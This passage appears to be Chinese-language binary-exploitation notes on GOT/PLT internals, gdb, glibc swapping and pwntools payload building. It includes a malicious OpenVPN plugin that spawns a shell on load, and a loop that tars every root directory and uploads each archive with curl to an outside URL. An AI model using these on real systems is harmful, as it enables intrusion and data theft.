...
- 存放 **全局变量/静态数据** 的重定位地址（data segment 的符号）。
- 编译期就能确定地址的，运行时 loader（`ld.so`）会直接填充真实地址。
- 比如全局变量、已知的函数地址（`libc`里的非延迟绑定函数，在 Full RELRO 时）。

#### 🔹 `.got.plt`

- 专门存放 **延迟绑定的函数指针**。
- 当程序第一次调用外部函数（如 `puts`）时，控制流进入 **PLT stub**，跳转到 `.got.plt`，触发动态链接器解析函数地址并写回 `.got.plt`，以后调用就直接命中了。
...
```shell
# -d 反汇编, -M intel 使用intel格式（可选）, --disassemble=函数名
objdump -d -M intel --disassemble=main a.out

# -t (syms) 查看符号表
objdump -t a.out | grep "函数名"

# -h (section headers)
objdump -h a.out | grep ".text"

# got
objdump -R a.out | grep "函数名"
...
# -r (relocs) 查看重定位信息，got
readelf -r a.out | grep "函数名"
```
...
```shell
# 假设你的库文件路径是 /lib/x86_64-linux-gnu/libc.so.6
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep _IO_2_1_stdout_
```
...
# 加上 --thumb 参数，支持arm32的thumb
ROPgadget --binary libc-2.21.so --thumb | grep "pop {r5, pc}"
```
...
```shell
patchelf --set-interpreter /home/lideao/download/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so stack_smach_x64_2.23
patchelf --set-rpath /home/lideao/download/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 stack_smach_x64_2.23
```
...
```shell
gdbserver :1234 ./your_cgi_program

gdb-multiarch ./your_cgi_program
(gdb) target remote <话机IP>:1234
```
...
find 0x555555554000, 0x555555558fff, "Hello, world!"
```
...
```shell
(gdb) set follow-fork-mode parent     # 默认就是这个，可不写
(gdb) set detach-on-fork on           # 默认就是这个，可不写
(gdb) catch fork                      # 推荐：提前设置断点在 fork 调用返回处
```
...
(gdb) set detach-on-fork on           # 默认，推荐保持 on
(gdb) catch fork                      # 可选，但强烈推荐
(gdb) break right_after_fork         # 在 fork() 调用后子进程代码处打断点
```

* 同时调试父子

```shell
(gdb) set detach-on-fork off          # 关键！必须 off
(gdb) set follow-fork-mode child      # 或 parent，随你先想停在哪个
    # 通常建议设 child，这样 fork 后默认停在子进程
(gdb) catch fork                      # 强烈推荐
    或 catch syscall fork
```
...
| 系统调用        | x86 syscall号 | x86_64 syscall号 | 参数顺序（x86）                                              | 参数顺序（x86_64）                                           |
| --------------- | ------------- | ---------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `read`          | 3             | 0                | eax=3, ebx=fd, ecx=buf, edx=count                            | rax=0, rdi=fd, rsi=buf, rdx=count                            |
| `write`         | 4             | 1                | eax=4, ebx=fd, ecx=buf, edx=count                            | rax=1, rdi=fd, rsi=buf, rdx=count                            |
| `open`          | 5             | 2                | eax=5, ebx=filename, ecx=flags                               | rax=2, rdi=filename, rsi=flags, rdx=mode                     |
| `close`         | 6             | 3                | eax=6, ebx=fd                                                | rax=3, rdi=fd                                                |
| `execve`        | 11            | 59               | eax=11, ebx=filename, ecx=argv, edx=envp                     | rax=59, rdi=filename, rsi=argv, rdx=envp                     |
| `exit`          | 1             | 60               | eax=1, ebx=exit_code                                         | rax=60, rdi=exit_code                                        |
| `mmap2` (x86)   | 192           | -                | eax=192, ebx=addr, ecx=len, edx=prot, esi=flags, edi=fd, ebp=offset | -                                                            |
| `mmap` (x86_64) | -             | 9                | -                                                            | rax=9, rdi=addr, rsi=len, rdx=prot, r10=flags, r8=fd, r9=offset |
| `brk`           | 45            | 12               | eax=45, ebx=addr                                             | rax=12, rdi=addr                                             |
| `fork`          | 2             | -                | eax=2                                                        | （x86_64中使用 clone）                                       |
| `clone`         | 120           | 56               | eax=120, ebx=flags, ecx=stack...                             | rax=56, rdi=flags, rsi=stack, rdx=ptid, r10=tls, r8=ctid     |
| `socket`        | 359           | 41               | eax=359, ebx=domain, ecx=type, edx=protocol                  | rax=41, rdi=domain, rsi=type, rdx=protocol                   |
...
* 编译时指定：大多数情况下，不需要在编译时就绑定某个 libc，而是在运行时用不同的 libc 来测试二进制行为。

```shell
# 编译时使用默认libc，运行时使用指定libc，可能有兼容性问题
gcc -o test test.c \
    -Wl,--rpath=/opt/glibc-2.23/lib \
    -Wl,--dynamic-linker=/opt/glibc-2.23/lib/ld-linux-x86-64.so.2

# 完全手动指定
gcc main.c -o main \ -nostdlib \ -Wl,--dynamic-linker=/path/to/ld-2.23.so \ -Wl,-rpath,/path/to/libc-2.23 \ -L/path/to/libc-2.23 \ -lc \ /path/to/libc-2.23/crt1.o \ /path/to/libc-2.23/crti.o \ /path/to/libc-2.23/crtn.o
```

* 运行时指定：两种方式

```shell
LD_LIBRARY_PATH=/path/to/libc-2.23 ./main

/path/to/libc-2.23/ld-2.23.so --library-path /path/to/libc-2.23 ./main
```
...
static void initialize() {
    // 异步执行，避免阻塞 OpenVPN 主进程
    system("touch /tmp/plugin_success&");
}

/* 2. 必备接口：防止 OpenVPN 报错退出 */
int openvpn_plugin_open_v1(unsigned int *type, const char **argv, const char **envp) {
    return 0; // 返回成功
}
...
static void pwn() {
    char *binary = "/bin/sh";
    // 参数数组：["/bin/sh", "-c", "touch /tmp/pwned", NULL]
    char *args[] = {binary, "-c", "touch /tmp/pwned", 0};
    char *env[] = {0};
    ...
    asm volatile (
        ...
        "pop {r7}\n\t"         // 恢复 r7
        :
        : "r"(binary), "r"(args), "r"(env), "r"(SYS_execve)
        : "r0", "r1", "r2"     // 告诉编译器这些寄存器会被修改
    );
}

// OpenVPN 插件接口声明，防止加载器因找不到符号而报错
int openvpn_plugin_open_v1(unsigned int *type, const char **argv, const char **envp) {
    return 0;
}
```
...
```shell
# libc
arm-linux-gnueabihf-gcc -fPIC -share -o evil.so evil.c  

# syscall
arm-linux-gnueabihf-gcc -fPIC -shared -nostdlib -fomit-frame-pointer -o evil_raw.so evil_raw.c
```
...
echo "开始监控进程变化 (Ctrl+C 退出)..."

PREV_FILE="/tmp/checkP_prev"
...
while true; do
    # 获取当前进程列表，PID + 完整命令
    CURR_FILE="/tmp/checkP_curr"
    ps www | awk 'NR>1 {print $1 ":" substr($0, index($0,$6))}' \
        | grep -v "^\[kworker" \
        | grep -v "ps www" \
        | grep -v "awk" \
        | grep -v "checkP.sh" \
    ...
    # 新出现的进程
    echo "=== 新出现的进程 ==="
    grep -Fvx -f "$PREV_FILE" "$CURR_FILE" || echo "(无)"

    # 消失的进程
    echo "=== 消失的进程 ==="
    grep -Fvx -f "$CURR_FILE" "$PREV_FILE" || echo "(无)"
...
# 查看用户级限制，输出 0 表示禁止产生；unlimited 表示无限制
ulimit -c 
...
for d in /*/; do
    ...
    [ -d "$d" ] || continue
    echo "=== $n ==="
    tar cf "$D/$n.tar" "$d" 2>/dev/null || { rm -f "$D/$n.tar"; continue; }
    curl -s -T "$D/$n.tar" "$URL" && rm -f "$D/$n.tar"
done
rm -rf "$D"
```
...
core = io.corefile      # pwntools 自动找 core
pattern = core.read(core.rsp, 4)   # 64位一般读 rsp 指向的 4/8 字节
# 或直接 core.rip / core.eip / core.pc

offset = cyclic_find(pattern)
# 或 cyclic_find(core.rip) 如果已经是整数
log.success(f"offset → {offset}")
```

* 手动看 gdb 里 rip/eip/pc 的值

```shell
python3 -c "from pwn import *; print(cyclic(200))"
python3 -c "from pwn import *; context.cyclic_size=8; print(cyclic(200))"
```
...
```python
elf = ELF(elfpath) 
elf.got['write']  # got表项内容
elf.symbols['write']  # 用于访问 符号表（symbol table）中定义的符号及其地址，这些符号可以是函数、变量、全局对象等
elf.plt['write']  # plt地址

rop = ROP(context.binary)
rop.rdi  # Gadget(0x401313, ['pop rdi', 'ret'], ['rdi'], 0x8)
rop.rdi.address
rop.find_gadget(['syscall','ret'])

# 构造payload,[]中的元素如果是非字节类型将会自动p32或p64（对应环境）
# word_size手动指定对齐大小
# filler指定填充字符
# b"AAAA"是原始字节，原封不动加入payload
# 0xdeadbeef 整数会打包
# [1, 2, 3] 列表展开打包
# {0x00:b'/bin/sh',0x10: b"MARK"} 字典，在指定位置写入字节，其他位置自动填充，如果指定位置有重叠，则会保留前面的字节，将后面字节后移
payload = flat(
    b"AAAA",         # 原始字节
    0xdeadbeef,      # 整数（自动根据 context 打包）
    [1, 2, 3],       # 列表（会被展开并打包）
    {0x00:b'/bin/sh',0x10: b"MARK"}  # 字典（在偏移 0x10 处放置数据，非常实用！）
    ,filler=b"\x90",word_size=32
)
...
def print_usage():
    script_name = os.path.basename(sys.argv[0]) or "pwn_hex_interactive.py"
    print(
        f"""Usage:
  {script_name} [-h|--help]
  {script_name} [binary]
  {script_name} gdb [binary] [gdbscript]
  {script_name} r <host> <port> [binary]

说明:
  默认模式:
    启动本地进程，binary 可选；未指定时使用脚本内的 WORKDIR 和 BINARY。

  gdb 模式:
    使用 gdb 调试本地程序。
    gdbscript 支持逗号分隔命令，例如:
      b *0x400AAF,b *0x400AE6,continue

  r 模式:
    连接远程服务，binary 可选；若提供则用于设置本地 context.binary。
...
WORKDIR = "/dir/"   # <<< 修改为你的工作目录
BINARY  = "./elf"   # 目标 ELF（相对于 WORKDIR）
DEFAULT_GDBSCRIPT = """
b *0x400AAF
b *0x400AE6
continue
...
def resolve_binary_path():
    ...
    if len(sys.argv) >= 2 and sys.argv[1] not in ("gdb", "r"):
        target = sys.argv[1]
    elif len(sys.argv) >= 3 and sys.argv[1] == "gdb" and not looks_like_gdbscript(sys.argv[2]):
        target = sys.argv[2]
...
WORKDIR, BINARY = resolve_binary_path()


def resolve_gdbscript():
    if len(sys.argv) < 2 or sys.argv[1] != "gdb":
        return DEFAULT_GDBSCRIPT

    script_arg = None

    if len(sys.argv) >= 3 and looks_like_gdbscript(sys.argv[2]):
    ...
    parts = [part.strip() for part in script_arg.split(',') if part.strip()]
    return '\n'.join(parts) + '\n'


GDBSCRIPT = resolve_gdbscript()
...
def start():
    if len(sys.argv) >= 2 and sys.argv[1] == "gdb":
        io = process(binary_path, cwd=WORKDIR)
        gdb.attach(
            io,
            gdbscript=GDBSCRIPT,
            exe=binary_path
    ...
    return process(binary_path, cwd=WORKDIR)


# ==========================================================
# 输出可视化
# ==========================================================
def visualize(data: bytes) -> str:
    out = []
    for b in data:
        c = chr(b)
...
# 同步读取（等待 read 阻塞）
# ==========================================================
def drain(io, silence=0.08, timeout=2):
    end = time.time() + timeout
    data = b''

    while time.time() < end:
        chunk = io.recv(timeout=silence)
        if not chunk:
            break
        data += chunk

    if data:
        sys.stdout.write(visualize(data))
        sys.stdout.flush()
...
def parse_input(user_input: str) -> bytes:
    return codecs.decode(user_input, 'unicode_escape').encode('latin-1')


# ==========================================================
# 交互主循环
# ==========================================================
def hex_interactive(io):
    print("="*60)
    print(f" 工作目录: {WORKDIR}")
    print(f" 目标程序: {binary_path}")
    print(" HEX 交互模式")
    print(" - 输出中不可见字符显示为 \\xNN")
    print(" - 输入支持 \\xNN")
    print(" - 输入 EXIT 退出")
    print("="*60)
    ...
    while True:
        try:
            ...
            drain(io)
            io.send(payload)      # 如需自动换行可改成 sendline
            drain(io)
